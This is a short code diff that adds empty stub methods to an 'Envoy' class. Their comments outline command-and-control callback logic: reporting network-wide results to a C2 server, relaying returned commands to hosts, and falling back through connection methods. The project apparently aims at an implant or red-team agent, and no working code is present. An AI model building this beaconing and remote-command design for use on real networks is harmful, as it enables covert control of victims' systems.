@@ -117,6 +117,21 @@ public:
 class Envoy : networkObject{
 protected:
     //linked list storing connection methods
+    //connection object storing the active Connection
+
+    bool doC2Callback(String JSONData){
+        //attempt to use the active connection
+        //send back result data from whole network with the hostname it came from. Include the IP of the envoy
+        //write any returned commands to the right host's $computer.CMD
+        //if that is null or times out, then call findC2Callback()
+    }
+
+    string findC2Callback(bool panic){
+        //start from the top of the linked list of conneciton methods and try all of them
+        //if one is found then set is as active and return true for success
+        //if panic is active then also run the loud callback methods
+        //if failed return false
+    }
 
     void doStep() {
         switch (state) {
